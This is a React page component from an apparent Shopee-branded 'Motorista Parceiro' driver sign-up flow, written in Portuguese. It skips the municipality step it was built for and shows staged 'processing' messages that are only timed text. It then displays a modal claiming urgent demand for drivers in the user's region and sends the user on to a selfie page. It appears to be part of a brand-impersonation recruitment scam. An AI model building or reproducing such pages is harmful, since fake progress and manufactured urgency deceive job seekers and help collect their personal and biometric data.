import React, { useState, useEffect, useMemo } from 'react';
import { useLocation } from 'wouter';
import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { Button } from '@/components/ui/button';
import { Checkbox } from '@/components/ui/checkbox';
import { Card } from '@/components/ui/card';
import { Dialog, DialogContent, DialogTitle, DialogDescription, DialogFooter } from '@/components/ui/dialog';
import { useToast } from '@/hooks/use-toast';
import { useAppContext } from '@/contexts/AppContext';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';

import municipiosPorEstado from '@/data/municipios-por-estado';

interface Municipio {
  nome: string;
  selecionado: boolean;
  entregas: number;
}

const Municipios: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const { cepData } = useAppContext();
  const [municipios, setMunicipios] = useState<Municipio[]>([]);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [showStartDateModal, setShowStartDateModal] = useState(false);
  const [selectedStartDate, setSelectedStartDate] = useState<string | null>(null);
  const [, navigate] = useLocation();
  const { toast } = useToast();

  useEffect(() => {
    const candidatoData = localStorage.getItem('candidato_data');
    if (!candidatoData || !cepData) {
      // Redirecionar para página inicial se não tiver os dados
      navigate('/');
      return;
    }

    // Pular a seleção de municípios e ir direto para a oportunidade de trabalho
    setLoading(false);
    // Mostrar automaticamente o modal de oportunidade de trabalho
    setShowStartDateModal(true);
  }, [cepData, navigate]);

  const toggleAllMunicipios = () => {
    // Verificar se todos estão selecionados
    const allSelected = municipios.every(m => m.selecionado);
    
    // Inverter a seleção de todos
    setMunicipios(municipios.map(m => ({
      ...m,
      selecionado: !allSelected
    })));
  };

  const toggleMunicipio = (index: number) => {
    const newMunicipios = [...municipios];
    newMunicipios[index].selecionado = !newMunicipios[index].selecionado;
    setMunicipios(newMunicipios);
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    setShowStartDateModal(true);
  };
  
  const handleStartDateSelection = (date: string) => {
    setSelectedStartDate(date);
    localStorage.setItem('start_date', date);
  };
  
  const handleStartDateContinue = () => {
    if (selectedStartDate) {
      setShowStartDateModal(false);
      navigate('/selfie');
    } else {
      toast({
        title: "Seleção necessária",
        description: "Por favor, selecione uma data para iniciar.",
        variant: "destructive",
      });
    }
  };
  
  // Gerar datas para os próximos 3 dias
  const getNextThreeDays = () => {
    const days = ['Domingo', 'Segunda-feira', 'Terça-feira', 'Quarta-feira', 'Quinta-feira', 'Sexta-feira', 'Sábado'];
    const months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'];
    
    const dates = [];
    const today = new Date();
    
    for (let i = 1; i <= 3; i++) {
      const date = new Date();
      date.setDate(today.getDate() + i);
      
      const dayName = days[date.getDay()];
      const dayNumber = date.getDate();
      const monthNumber = months[date.getMonth()];
      
      dates.push({
        full: `${dayName} ${dayNumber}/${monthNumber}`,
        value: `${dayNumber}/${monthNumber}/2025`
      });
    }
    
    return dates;
  };

  const handleSubmit = () => {
    const municipiosSelecionados = municipios.filter(m => m.selecionado).map(m => m.nome);
    
    if (municipiosSelecionados.length === 0) {
      toast({
        title: "Seleção necessária",
        description: "Selecione pelo menos um município para continuar.",
        variant: "destructive",
      });
      return;
    }

    setSubmitting(true);

    try {
      // Recuperar dados do candidato
      const candidatoData = JSON.parse(localStorage.getItem('candidato_data') || '{}');
      
      // Adicionar municípios selecionados e informações de entregas
      const municipiosComEntregas = municipios
        .filter(m => m.selecionado)
        .map(m => ({
          nome: m.nome,
          entregas: m.entregas
        }));
      
      const dadosCompletos = {
        ...candidatoData,
        municipios: municipiosComEntregas,
        totalEntregas: municipiosComEntregas.reduce((acc, m) => acc + m.entregas, 0)
      };
      
      // Guardar dados completos
      localStorage.setItem('candidato_data_completo', JSON.stringify(dadosCompletos));
      
      // Mostrar modal de carregamento
      setShowLoadingModal(true);
      
    } catch (error) {
      toast({
        title: "Erro no cadastro",
        description: "Ocorreu um erro ao processar suas informações. Tente novamente.",
        variant: "destructive",
      });
      setSubmitting(false);
    }
  };

  if (loading) {
    return (
      <div className="bg-white min-h-screen flex flex-col">
        <Header />
        <div className="flex-grow container mx-auto px-4 py-8 flex items-center justify-center">
          <div className="text-center">
            <div className="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-[#EE4E2E] border-r-transparent"></div>
            <p className="mt-4 text-gray-600">Carregando municípios...</p>
          </div>
        </div>
        <Footer />
      </div>
    );
  }

  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      
      <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
        {/* Meia-lua no canto direito */}
        <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
        
        <div className="flex items-center relative z-10">
          <div className="text-white mr-3">
            <i className="fas fa-chevron-right text-3xl font-black" style={{color: 'white'}}></i>
          </div>
          <div className="leading-none">
            <h1 className="text-base font-bold text-white mb-0">Motorista Parceiro</h1>
            <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Shopee</p>
          </div>
        </div>
      </div>
      
      <div className="flex-grow container mx-auto py-8 w-full">
        <div className="w-full mx-auto p-6 mb-8">
          <div className="text-center">
            <h1 className="text-2xl font-bold mb-4 text-gray-800">Processando seu Cadastro...</h1>
            <p className="text-gray-600 mb-6">
              Aguarde, estamos verificando as oportunidades de trabalho disponíveis na sua região.
            </p>
            <div className="inline-block w-6 h-6 border-2 border-[#E83D22] border-t-transparent rounded-full animate-spin"></div>
          </div>
        </div>
      </div>
      
      <Footer />
      
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Processando Seleção"
        loadingSteps={[
          "Verificando municípios selecionados",
          "Calculando rotas de entrega",
          "Analisando demanda regional",
          "Verificando disponibilidade de vagas"
        ]}
        completionMessage="Municípios registrados com sucesso!"
        loadingTime={12000}
      />
      
      {/* Modal de seleção de data de início */}
      <Dialog open={showStartDateModal} onOpenChange={setShowStartDateModal}>
        <DialogContent className="p-0 sm:max-w-none w-full h-full max-h-screen overflow-hidden border-none shadow-none bg-white">
          <div className="absolute top-0 left-0 w-full h-full bg-white z-0"></div>
          
          <div className="relative flex flex-col justify-center items-center h-screen bg-transparent z-10 p-6 max-w-md mx-auto">
            <DialogTitle className="text-2xl font-bold text-[#E83D22] text-center mb-4">
              <i className="fas fa-exclamation-circle mr-2"></i>
              Atenção! Oportunidade de Trabalho
            </DialogTitle>
            
            <DialogDescription className="text-base text-center text-gray-700 py-3 mb-4 bg-[#FFF8F6] rounded-lg border border-[#E83D2220] p-4">
              Na região que você escolheu, estamos com <span className="font-bold text-[#E83D22]">URGENTE</span> necessidade
              de novos entregadores, pois a demanda de entregas está alta e temos poucos entregadores cadastrados.
            </DialogDescription>
            
            <div className="my-6 w-full">
              <h3 className="font-medium text-gray-800 mb-4 text-center text-lg">Quando você pode começar?</h3>
              
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 mt-5">
                {getNextThreeDays().map((date, index) => (
                  <Button
                    key={index}
                    type="button"
                    variant={selectedStartDate === date.value ? "default" : "outline"}
                    onClick={() => handleStartDateSelection(date.value)}
                    className={`py-4 px-2 h-auto text-base ${selectedStartDate === date.value ? 'bg-[#E83D22] hover:bg-[#d73920] border-[#E83D22] shadow-md' : 'border-gray-300 hover:border-[#E83D22] hover:text-[#E83D22]'}`}
                  >
                    {date.full}
                  </Button>
                ))}
              </div>
              
              <Button
                type="button"
                variant={selectedStartDate === 'outro' ? "default" : "outline"}
                onClick={() => handleStartDateSelection('outro')}
                className={`w-full mt-4 py-4 h-auto text-base ${selectedStartDate === 'outro' ? 'bg-[#E83D22] hover:bg-[#d73920] border-[#E83D22] shadow-md' : 'border-gray-300 hover:border-[#E83D22] hover:text-[#E83D22]'}`}
              >
                Outro dia
              </Button>
            </div>
            
            <div className="mt-6 w-full">
              <Button 
                type="button" 
                onClick={handleStartDateContinue}
                className="w-full bg-[#E83D22] hover:bg-[#d73920] text-white font-medium text-lg py-6" 
                style={{ height: '60px' }}
                disabled={!selectedStartDate}
              >
                Continuar
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Municipios;